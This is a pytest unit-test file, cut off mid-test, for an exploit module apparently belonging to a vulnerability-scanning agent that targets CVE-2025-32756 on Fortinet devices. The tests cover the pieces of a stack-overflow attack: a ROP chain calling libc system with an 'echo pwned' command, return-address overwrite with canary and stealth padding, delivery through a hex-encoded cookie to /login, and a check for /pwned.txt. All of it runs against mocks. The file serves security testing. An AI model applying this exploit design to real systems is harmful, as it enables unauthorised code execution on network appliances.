"""Unit tests for Agent Asteroid: CVE-2025-32756"""

import logging  # For caplog.set_level
import struct
from unittest import mock
import typing  # For Generator

import pytest  # For parametrize and raising exceptions
import requests  # For requests.exceptions

from agent import definitions
from agent.exploits import cve_2025_32756  # This is the module under test


# Helper to setup a basic pwn mock for exploit instantiation and basic operations
def _get_mock_pwn_module() -> mock.MagicMock:
    """Creates a mock pwn module object with necessary attributes for exploit initialization and basic functions."""
    mock_pwn = mock.MagicMock()
    # Attributes for __init__
    mock_pwn.context = mock.MagicMock()
    mock_pwn.context.arch = cve_2025_32756.TARGET_ARCHITECTURE
    mock_pwn.context.endian = cve_2025_32756.TARGET_ENDIANNESS
    if cve_2025_32756.TARGET_ARCHITECTURE in ["amd64", "aarch64"]:
        mock_pwn.context.bits = 64
    elif cve_2025_32756.TARGET_ARCHITECTURE in ["i386", "arm"]:
        mock_pwn.context.bits = 32
    else:
        mock_pwn.context.bits = (
            64 if cve_2025_32756.TARGET_ARCHITECTURE == "amd64" else 32
        )

    # Methods for _pack_address
    mock_pwn.p64 = mock.MagicMock(side_effect=lambda x: struct.pack("<Q", x))
    mock_pwn.p32 = mock.MagicMock(side_effect=lambda x: struct.pack("<I", x))

    # Exception type for _pack_address
    mock_pwn.pwnlib = mock.MagicMock()
    mock_pwn.pwnlib.exception = mock.MagicMock()
    mock_pwn.pwnlib.exception.PwnlibException = type(
        "PwnlibException", (Exception,), {}
    )
    return mock_pwn


@pytest.fixture
def exploit_instance() -> cve_2025_32756.FortinetCVE202532756Exploit:
    """Fixture to create an exploit instance with pwn mocked."""
    with mock.patch("agent.exploits.cve_2025_32756.pwn", _get_mock_pwn_module()):
        instance = cve_2025_32756.FortinetCVE202532756Exploit()
    return instance


# --- Tests for __init__ ---
def testExploitInit_whenPwnImportFails_raisesImportError() -> None:
    """Test that exploit raises ImportError if pwn is None at module level during init."""
    with mock.patch("agent.exploits.cve_2025_32756.pwn", None):
        with pytest.raises(ImportError, match="Pwntools could not be imported"):
            cve_2025_32756.FortinetCVE202532756Exploit()


# --- Tests for _pack_address ---
def testPackAddress_amd64(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 8
    addr = 0x4142434445464748
    packed = exploit_instance._pack_address(addr)
    assert packed == b"\x48\x47\x46\x45\x44\x43\x42\x41"


def testPackAddress_i386(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 4
    addr = 0x41424344
    packed = exploit_instance._pack_address(addr)
    assert packed == b"\x44\x43\x42\x41"


def testPackAddress_wrongType_raisesTypeError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    with pytest.raises(TypeError, match="Address must be int"):
        exploit_instance._pack_address("not_an_int")  # type: ignore


def testPackAddress_pwnNone_raisesRuntimeError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    with mock.patch("agent.exploits.cve_2025_32756.pwn", None):
        with pytest.raises(RuntimeError, match="Pwntools not available"):
            exploit_instance._pack_address(0x123)


def testPackAddress_unsupportedPointerSize_raisesValueError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 16  # Unsupported
    with pytest.raises(ValueError, match="Unsupported pointer size"):
        exploit_instance._pack_address(0x123)


def testPackAddress_pwnPackingFails_raisesValueError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 8
    mock_pwn_instance = _get_mock_pwn_module()
    PwnlibException = type("PwnlibException", (Exception,), {})
    mock_pwn_instance.pwnlib.exception.PwnlibException = PwnlibException
    mock_pwn_instance.p64.side_effect = PwnlibException("Packing failed")

    with mock.patch("agent.exploits.cve_2025_32756.pwn", mock_pwn_instance):
        with pytest.raises(ValueError, match="Pwntools packing failed for 0x123"):
            exploit_instance._pack_address(0x123)


# --- Tests for _generate_safe_random_padding ---
def testGenerateSafeRandomPadding_nNegative(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    assert exploit_instance._generate_safe_random_padding(-5) == b"\xff" * 5


def testGenerateSafeRandomPadding_nZero(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    assert exploit_instance._generate_safe_random_padding(0) == b""


@mock.patch("secrets.token_bytes")
def testGenerateSafeRandomPadding_noBadChars(
    mock_token_bytes: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    mock_token_bytes.return_value = b"\x01\x02\x03\x04\x05"
    exploit_instance.bad_chars_set = set()
    padding = exploit_instance._generate_safe_random_padding(5)
    assert padding == b"\x01\x02\x03\x04\x05"
    mock_token_bytes.assert_called_once_with(5)


@mock.patch("secrets.token_bytes")
def testGenerateSafeRandomPadding_withBadChars(
    mock_token_bytes: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.bad_chars_set = {0x0A, 0x0D}
    mock_token_bytes.side_effect = [
        b"\x0a",
        b"\x01",
        b"\x0d",
        b"\x02",
        b"\x03",
        b"\x04",
        b"\x05",
    ] * 20
    padding = exploit_instance._generate_safe_random_padding(3)
    assert len(padding) == 3
    for byte_val in padding:
        assert byte_val not in exploit_instance.bad_chars_set
    assert mock_token_bytes.call_count >= 3


def testGenerateSafeRandomPadding_allBadChars_raisesValueError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.bad_chars_set = set(range(256))
    with pytest.raises(ValueError, match="All bytes forbidden"):
        exploit_instance._generate_safe_random_padding(5)


@mock.patch("secrets.token_bytes")
def testGenerateSafeRandomPadding_generationFails_raisesValueError(
    mock_token_bytes: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.bad_chars_set = {0x01}
    mock_token_bytes.return_value = b"\x01"
    with pytest.raises(ValueError, match="Padding gen failed"):
        exploit_instance._generate_safe_random_padding(5)


# --- Tests for _update_dependent_addresses ---
def testUpdateDependentAddresses_populatesGadgetsAndAddresses(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    original_flat_gadgets = cve_2025_32756.ROP_FLAT_GADGETS.copy()
    original_module_gadgets = cve_2025_32756.ROP_MODULE_GADGET_OFFSETS.copy()
    original_module_offsets = cve_2025_32756.ADDR_MODULE_OFFSETS.copy()

    cve_2025_32756.ROP_FLAT_GADGETS = {"flat_pop_rax": 0x1000}
    cve_2025_32756.ROP_MODULE_GADGET_OFFSETS = {"target_binary": {"mod_pop_rbx": 0x200}}
    cve_2025_32756.ADDR_MODULE_OFFSETS = {"libc": {"puts": 0xABC}}

    exploit_instance.base_addresses = {
        "target_binary": 0x400000,
        "libc": 0x700000,
        "input_buffer_base": 0,
    }
    exploit_instance._update_dependent_addresses()

    assert exploit_instance.all_gadgets["flat_pop_rax"] == 0x1000
    assert exploit_instance.all_gadgets["target_binary_mod_pop_rbx"] == 0x400000 + 0x200
    assert exploit_instance.all_addresses["libc_puts"] == 0x700000 + 0xABC

    caplog.clear()
    cve_2025_32756.ROP_MODULE_GADGET_OFFSETS = {"missing_module": {"gadget": 0x300}}
    exploit_instance._update_dependent_addresses()
    assert "Base for module 'missing_module' not found for gadgets." in caplog.text

    caplog.clear()
    cve_2025_32756.ADDR_MODULE_OFFSETS = {"missing_module2": {"symbol": 0x400}}
    exploit_instance._update_dependent_addresses()
    assert "Base for module 'missing_module2' not found for symbols." in caplog.text

    cve_2025_32756.ROP_FLAT_GADGETS = original_flat_gadgets
    cve_2025_32756.ROP_MODULE_GADGET_OFFSETS = original_module_gadgets
    cve_2025_32756.ADDR_MODULE_OFFSETS = original_module_offsets


# --- Tests for _build_exploit_code ---
def testBuildExploitCode_success(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 8
    exploit_instance.all_gadgets = {"pop_rdi_ret": 0x401000}
    exploit_instance.all_addresses = {
        cve_2025_32756._addr_key("libc", "system"): 0x7F000050000
    }
    cve_2025_32756.ROP_COMMAND_VERIFICATION = "echo pwned"

    code = exploit_instance._build_exploit_code()

    assert code is not None
    packed_pop_rdi = struct.pack("<Q", 0x401000)
    packed_system = struct.pack("<Q", 0x7F000050000)
    cmd_bytes = b"echo pwned\0"
    placeholder = cve_2025_32756.ADDRESS_PLACEHOLDER_BYTES[:8]

    expected_code = packed_pop_rdi + placeholder + packed_system + cmd_bytes
    assert code == expected_code
    assert exploit_instance.rop_cmd_addr_placeholder_offset == len(packed_pop_rdi)


def testBuildExploitCode_missingPopRdi_returnsNone(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    exploit_instance.all_gadgets = {}
    exploit_instance.all_addresses = {
        cve_2025_32756._addr_key("libc", "system"): 0x12345
    }
    assert exploit_instance._build_exploit_code() is None
    assert "ROP build: Missing pop_rdi_ret" in caplog.text


def testBuildExploitCode_missingSystem_returnsNone(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    exploit_instance.all_gadgets = {"pop_rdi_ret": 0x123}
    exploit_instance.all_addresses = {}
    assert exploit_instance._build_exploit_code() is None
    assert "ROP build: Missing system address" in caplog.text


def testBuildExploitCode_packAddressFails_returnsNone(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    exploit_instance.all_gadgets = {"pop_rdi_ret": 0x401000}
    exploit_instance.all_addresses = {
        cve_2025_32756._addr_key("libc", "system"): 0x7F000050000
    }
    with mock.patch.object(
        exploit_instance, "_pack_address", side_effect=ValueError("Pack fail")
    ):
        assert exploit_instance._build_exploit_code() is None
    assert "ROP build error (possibly from packing): Pack fail" in caplog.text


# --- Tests for _craft_exploit_payload ---
@pytest.fixture
def configured_exploit_for_crafting(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> typing.Generator[cve_2025_32756.FortinetCVE202532756Exploit, None, None]:
    exploit = exploit_instance
    exploit.pointer_size = 8
    exploit.base_addresses = {
        "input_buffer_base": cve_2025_32756.ADDR_FIXED_INPUT_BUFFER_BASE,
        "target_binary": cve_2025_32756.ADDR_FIXED_TARGET_BINARY_BASE,
        "libc": cve_2025_32756.ADDR_FIXED_LIBC_BASE,
    }
    exploit.rop_cmd_addr_placeholder_offset = 8

    # Save original global constants locally in the fixture
    orig_stack_buffer_offset = cve_2025_32756.STACK_BUFFER_OFFSET
    orig_stack_buffer_size = cve_2025_32756.STACK_BUFFER_SIZE
    orig_stack_canary_offset = cve_2025_32756.STACK_CANARY_OFFSET
    orig_stack_saved_rbp_offset = cve_2025_32756.STACK_SAVED_RBP_OFFSET
    orig_stack_return_address_overwrite_offset = (
        cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET
    )
    orig_stealth_random_padding_size = cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE

    # Set specific values for tests under this fixture
    cve_2025_32756.STACK_BUFFER_OFFSET = 64
    cve_2025_32756.STACK_BUFFER_SIZE = 256
    cve_2025_32756.STACK_CANARY_OFFSET = 0
    cve_2025_32756.STACK_SAVED_RBP_OFFSET = 328
    cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET = 336
    cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE = 0
    exploit.bad_chars_set = {
        int(b_val, 16) for b_val in cve_2025_32756.PAYLOAD_BAD_CHARS_HEX
    }
    yield exploit  # provide the configured instance

    # Restore original global constants
    cve_2025_32756.STACK_BUFFER_OFFSET = orig_stack_buffer_offset
    cve_2025_32756.STACK_BUFFER_SIZE = orig_stack_buffer_size
    cve_2025_32756.STACK_CANARY_OFFSET = orig_stack_canary_offset
    cve_2025_32756.STACK_SAVED_RBP_OFFSET = orig_stack_saved_rbp_offset
    cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET = (
        orig_stack_return_address_overwrite_offset
    )
    cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE = orig_stealth_random_padding_size


def testCraftExploitPayload_unpatchedCodeNone_returnsNone(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    assert configured_exploit_for_crafting._craft_exploit_payload(None) is None
    assert "Unpatched code is None" in caplog.text


def testCraftExploitPayload_negativePaddingBeforeOw_returnsNone(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET = 10  # Intentionally too small
    unpatched_code = b"ROP_STUFF" + (b"A" * 20)
    assert (
        configured_exploit_for_crafting._craft_exploit_payload(unpatched_code) is None
    )
    assert "Negative padding_before_overwrite" in caplog.text


@mock.patch("agent.exploits.cve_2025_32756.secrets.token_bytes", return_value=b"S")
def testCraftExploitPayload_successBasic(
    mock_secrets: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit = configured_exploit_for_crafting
    exploit.rop_cmd_addr_placeholder_offset = 8
    unpatched_rop_gadgets = (
        b"B" * 8 + cve_2025_32756.ADDRESS_PLACEHOLDER_BYTES[:8] + b"C" * 8
    )
    cmd_str = b"my_cmd\0"
    unpatched_code = unpatched_rop_gadgets + cmd_str

    rbp_s = exploit.pointer_size
    overwrite_block_s = rbp_s + exploit.pointer_size
    padding_before_ow = (
        cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET
        - overwrite_block_s
        - (cve_2025_32756.STACK_BUFFER_OFFSET + cve_2025_32756.STACK_BUFFER_SIZE)
    )
    assert padding_before_ow == 0

    exploit_code_start_off = (
        cve_2025_32756.STACK_BUFFER_OFFSET
        + cve_2025_32756.STACK_BUFFER_SIZE
        + padding_before_ow
        + overwrite_block_s
        + cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE
    )
    exploit_code_live_ad = (
        exploit.base_addresses["input_buffer_base"] + exploit_code_start_off
    )
    live_cmd_str_ad = exploit_code_live_ad + len(unpatched_rop_gadgets)

    payload = exploit._craft_exploit_payload(unpatched_code)
    assert payload is not None

    expected_prefix = bytearray()
    expected_prefix.extend(b"A" * cve_2025_32756.STACK_BUFFER_OFFSET)
    expected_prefix.extend(b"A" * cve_2025_32756.STACK_BUFFER_SIZE)
    expected_prefix.extend(b"R" * rbp_s)
    expected_prefix.extend(exploit._pack_address(exploit_code_live_ad))

    patched_rop_code_arr = bytearray(unpatched_rop_gadgets)
    packed_cmd_ad = exploit._pack_address(live_cmd_str_ad)
    p_start = exploit.rop_cmd_addr_placeholder_offset
    patched_rop_code_arr[p_start : p_start + exploit.pointer_size] = packed_cmd_ad
    final_rop_code_section = bytes(patched_rop_code_arr) + cmd_str

    expected_payload = bytes(expected_prefix) + final_rop_code_section
    assert payload == expected_payload


def testCraftExploitPayload_withCanaryAndStealthPadding(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit = configured_exploit_for_crafting

    cve_2025_32756.STACK_BUFFER_SIZE = (
        248  # Adjusted to make padding_before_ow = 0 with canary
    )
    cve_2025_32756.STACK_CANARY_OFFSET = (
        320  # Buffer (64+248=312), Canary (320), RBP (328), Ret (336)
    )
    cve_2025_32756.STACK_SAVED_RBP_OFFSET = 328
    cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET = 336
    cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE = 5

    exploit.rop_cmd_addr_placeholder_offset = 8
    unpatched_code = (
        b"B" * 8 + cve_2025_32756.ADDRESS_PLACEHOLDER_BYTES[:8] + b"C" * 8 + b"cmd\0"
    )

    with mock.patch.object(
        exploit, "_generate_safe_random_padding", return_value=b"S" * 5
    ) as mock_gen_pad:
        payload = exploit._craft_exploit_payload(unpatched_code)
    assert payload is not None
    mock_gen_pad.assert_called_once_with(5)  # For STEALTH_RANDOM_PADDING_SIZE
    assert b"\xcc" * 8 in payload  # Canary bytes (default fill)
    assert b"S" * 5 in payload  # Stealth padding


# --- Tests for _trigger_vulnerability ---
@mock.patch("requests.Session.request")
def testTriggerVulnerability_success(
    mock_http_request: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit = configured_exploit_for_crafting
    payload = b"\x41\x42\x43"
    host, port = "testhost", 8080
    # Ensure global constants are set for the test if not covered by fixture
    orig_trigger_payload_location = cve_2025_32756.TRIGGER_PAYLOAD_LOCATION
    orig_trigger_cookie_name = cve_2025_32756.TRIGGER_COOKIE_NAME
    orig_target_vulnerable_path = cve_2025_32756.TARGET_VULNERABLE_PATH
    orig_timing_request_timeout = cve_2025_32756.TIMING_REQUEST_TIMEOUT_SECONDS

    cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = "cookie_hex"
    cve_2025_32756.TRIGGER_COOKIE_NAME = "SESS"
    cve_2025_32756.TARGET_VULNERABLE_PATH = "/login"
    cve_2025_32756.TIMING_REQUEST_TIMEOUT_SECONDS = 5

    try:
        assert exploit._trigger_vulnerability(payload, host, port) is True
        mock_http_request.assert_called_once()
        _args, kwargs = mock_http_request.call_args
        assert kwargs["method"] == "GET"
        assert kwargs["url"] == f"http://{host}:{port}/login"
        assert kwargs["cookies"] == {"SESS": payload.hex()}
        assert kwargs["timeout"] == 5
    finally:
        cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = orig_trigger_payload_location
        cve_2025_32756.TRIGGER_COOKIE_NAME = orig_trigger_cookie_name
        cve_2025_32756.TARGET_VULNERABLE_PATH = orig_target_vulnerable_path
        cve_2025_32756.TIMING_REQUEST_TIMEOUT_SECONDS = orig_timing_request_timeout


def testTriggerVulnerability_payloadNone_returnsFalse(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    assert (
        configured_exploit_for_crafting._trigger_vulnerability(None, "h", 80) is False
    )
    assert "Payload is None" in caplog.text


def testTriggerVulnerability_unsupportedLocation_returnsFalse(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    original_location = cve_2025_32756.TRIGGER_PAYLOAD_LOCATION
    cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = "unsupported"
    try:
        assert (
            configured_exploit_for_crafting._trigger_vulnerability(b"p", "h", 80)
            is False
        )
        assert "Unsupported trigger location" in caplog.text
    finally:
        cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = original_location


@mock.patch("requests.Session.request", side_effect=requests.exceptions.Timeout)
def testTriggerVulnerability_timeout_returnsTrue(
    mock_http_request: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    original_location = cve_2025_32756.TRIGGER_PAYLOAD_LOCATION
    cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = "cookie_hex"
    try:
        assert (
            configured_exploit_for_crafting._trigger_vulnerability(b"p", "h", 80)
            is True
        )
        assert "Trigger timed out (expected?)" in caplog.text
    finally:
        cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = original_location


@mock.patch("requests.Session.request", side_effect=requests.exceptions.ConnectionError)
def testTriggerVulnerability_requestException_returnsFalse(
    mock_http_request: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    original_location = cve_2025_32756.TRIGGER_PAYLOAD_LOCATION
    cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = "cookie_hex"
    try:
        assert (
            configured_exploit_for_crafting._trigger_vulnerability(b"p", "h", 80)
            is False
        )
        assert "Trigger failed" in caplog.text
    finally:
        cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = original_location


# --- Tests for _verify_exploit_success ---
@mock.patch("time.sleep", return_value=None)
@mock.patch("requests.Session.get")
def testVerifyExploitSuccess_success(
    mock_http_get: mock.Mock,
    mock_sleep: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit = configured_exploit_for_crafting
    host, port = "testhost", 80

    # Save and set globals for this test
    orig_target_use_https = cve_2025_32756.TARGET_USE_HTTPS
    orig_ver_path = cve_2025_32756.VERIFICATION_HTTP_FILE_PATH
    orig_ver_content = cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT
    orig_ver_timeout = cve_2025_32756.VERIFICATION_TIMEOUT_SECONDS
    orig_post_trigger_delay = cve_2025_32756.TIMING_POST_TRIGGER_DELAY_SECONDS

    cve_2025_32756.TARGET_USE_HTTPS = False
    cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = "/pwned.txt"
    cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT = "PWNED_CONTENT"
    cve_2025_32756.VERIFICATION_TIMEOUT_SECONDS = 3
    cve_2025_32756.TIMING_POST_TRIGGER_DELAY_SECONDS = 1

    mock_response = mock.Mock()
    mock_response.status_code = 200
    mock_response.content = b"Some stuff PWNED_CONTENT more stuff"
    mock_http_get.return_value = mock_response

    try:
        assert exploit._verify_exploit_success(host, port) is True
        mock_sleep.assert_called_once_with(1)
        mock_http_get.assert_called_once_with(
            f"http://{host}:{port}/pwned.txt", timeout=3, allow_redirects=True
        )
    finally:
        cve_2025_32756.TARGET_USE_HTTPS = orig_target_use_https
        cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = orig_ver_path
        cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT = orig_ver_content
        cve_2025_32756.VERIFICATION_TIMEOUT_SECONDS = orig_ver_timeout
        cve_2025_32756.TIMING_POST_TRIGGER_DELAY_SECONDS = orig_post_trigger_delay


@mock.patch("time.sleep", return_value=None)
@mock.patch("requests.Session.get")
def testVerifyExploitSuccess_failStatus(
    mock_http_get: mock.Mock,
    mock_sleep: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    caplog.set_level(logging.DEBUG)
    exploit = configured_exploit_for_crafting
    mock_response = mock.Mock()
    mock_response.status_code = 404
    mock_response.content = b""
    orig_ver_path = cve_2025_32756.VERIFICATION_HTTP_FILE_PATH
    cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = "/file.txt"
    mock_http_get.return_value = mock_response
    try:
        assert exploit._verify_exploit_success("h", 80) is False
        assert (
            "Verify failed: http://h:80/file.txt status 404, content mismatch/not found."
            in caplog.text
        )
    finally:
        cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = orig_ver_path


@mock.patch("time.sleep", return_value=None)
@mock.patch("requests.Session.get")
def testVerifyExploitSuccess_failContent(
    mock_http_get: mock.Mock,
    mock_sleep: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    caplog.set_level(logging.DEBUG)
    exploit = configured_exploit_for_crafting
    mock_response = mock.Mock()
    mock_response.status_code = 200
    mock_response.content = b"WRONG_CONTENT"

    orig_ver_content = cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT
    orig_ver_path = cve_2025_32756.VERIFICATION_HTTP_FILE_PATH
    cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT = "EXPECTED"
    cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = "/file.txt"
    mock_http_get.return_value = mock_response
    try:
        assert exploit._verify_exploit_success("h", 80) is False
        assert (
            "Verify failed: http://h:80/file.txt status 200, content mismatch/not found."
            in caplog.text
        )
    finally:
        cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT = orig_ver_content
        cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = orig_ver_path


@mock.patch("time.sleep", return_value=None)
@mock.patch(
    "requests.Session.get",
    side_effect=requests.exceptions.RequestException("HTTP Boom"),
)
def testVerifyExploitSuccess_requestException(
    mock_http_get: mock.Mock,
    mock_sleep: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    caplog.set_level(logging.DEBUG)
    orig_ver_path = cve_2025_32756.VERIFICATION_HTTP_FILE_PATH
    cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = "/the/path.txt"
    try:
        assert configured_exploit_for_crafting._verify_exploit_success("h", 80) is False
        assert "Verify HTTP error for '/the/path.txt': HTTP Boom" in caplog.text
    finally:
        cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = orig_ver_path


# --- Tests for accept() method (existing tests, adapted to use fixture if needed) ---
@mock.patch("requests.Session.get")
def testAccept_whenFortinetIndicatorHttpAnd200_shouldReturnTrue(
    mock_requests_session_get: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    mock_response = mock.Mock()
    mock_response.text = "Welcome to FortiMail Gateway"
    mock_response.content = b"Welcome to FortiMail Gateway"
    mock_response.status_code = 200
    mock_requests_session_get.return_value = mock_response

    target = definitions.Target(host="localhost", port=80, scheme="http")
    assert exploit_instance.accept(target) is True
    mock_requests_session_get.assert_called_once()
    call_args = mock_requests_session_get.call_args[0]
    assert call_args[0] == "http://localhost:80/user/login"


@mock.patch("requests.Session.get")
def testAccept_whenFortinetIndicatorHttpsAnd200_shouldReturnTrue(
    mock_requests_session_get: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    mock_response = mock.Mock()
    mock_response.text = "FortiVoice Administration Interface"
    mock_response.content = b"FortiVoice Administration Interface"
    mock_response.status_code = 200
    mock_requests_session_get.return_value = mock_response

    target = definitions.Target(host="localhost", port=443, scheme="https")
    assert exploit_instance.accept(target) is True
    mock_requests_session_get.assert_called_once()
    call_args = mock_requests_session_get.call_args[0]
    assert call_args[0] == "https://localhost:443/user/login"


@mock.patch("requests.Session.get")
def testAccept_whenNoFortinetIndicatorAnd200_shouldReturnFalse(
    mock_requests_session_get: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    mock_response = mock.Mock()
    mock_response.text = "Some other web server"
    mock_response.content = b"Some other web server"
    mock_response.status_code = 200
    mock_requests_session_get.return_value = mock_response

    target = definitions.Target(host="localhost", port=80, scheme="http")
    assert exploit_instance.accept(target) is False


@mock.patch("requests.Session.get")
def testAccept_whenRequestException_shouldReturnFalse(
    mock_requests_session_get: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    mock_requests_session_get.side_effect = requests.exceptions.RequestException(
        "Connection error"
    )
    target = definitions.Target(host="localhost", port=80, scheme="http")
    assert exploit_instance.accept(target) is False


@mock.patch("requests.Session.get")
def testAccept_whenHttpStatusNot200OrBelow500_shouldReturnFalse(
    mock_requests_session_get: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    mock_response = mock.Mock()
    mock_response.text = "Server Error"
    mock_response.content = b"Server Error"
    mock_response.status_code = 503
    mock_requests_session_get.return_value = mock_response
    target = definitions.Target(host="localhost", port=80, scheme="http")
    assert exploit_instance.accept(target) is False


# --- Tests for check() method (existing tests, adapted to use fixture) ---
def testCheck_whenPwnModuleIsNoneInCheckMethod_shouldReturnEmptyList(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with mock.patch("agent.exploits.cve_2025_32756.pwn", None):
        vulnerabilities = exploit_instance.check(target)
        assert len(vulnerabilities) == 0


def testCheck_whenBuildExploitCodeFails_shouldReturnEmptyList(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with mock.patch.object(
        exploit_instance, "_build_exploit_code", return_value=None
    ) as mock_build:
        vulnerabilities = exploit_instance.check(target)
        assert len(vulnerabilities) == 0
        mock_build.assert_called_once()


def testCheck_whenCraftPayloadFails_shouldReturnEmptyList(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with (
        mock.patch.object(
            exploit_instance, "_build_exploit_code", return_value=b"dummy_code"
        ),
        mock.patch.object(
            exploit_instance, "_craft_exploit_payload", return_value=None
        ) as mock_craft,
    ):
        vulnerabilities = exploit_instance.check(target)
        assert len(vulnerabilities) == 0
        mock_craft.assert_called_once_with(b"dummy_code")


@mock.patch("time.sleep", return_value=None)
def testCheck_whenVerificationFails_shouldReturnEmptyList(
    mock_sleep: mock.Mock, exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with (
        mock.patch.object(
            exploit_instance, "_build_exploit_code", return_value=b"dummy_code"
        ),
        mock.patch.object(
            exploit_instance, "_craft_exploit_payload", return_value=b"dummy_payload"
        ),
        mock.patch.object(
            exploit_instance, "_trigger_vulnerability", return_value=True
        ),
        mock.patch.object(
            exploit_instance, "_verify_exploit_success", return_value=False
        ) as mock_verify,
    ):
        vulnerabilities = exploit_instance.check(target)
        assert len(vulnerabilities) == 0
        mock_verify.assert_called_once_with(target.host, target.port)


@mock.patch("time.sleep", return_value=None)
def testCheck_whenExploitationSucceeds_shouldReportVulnerability(
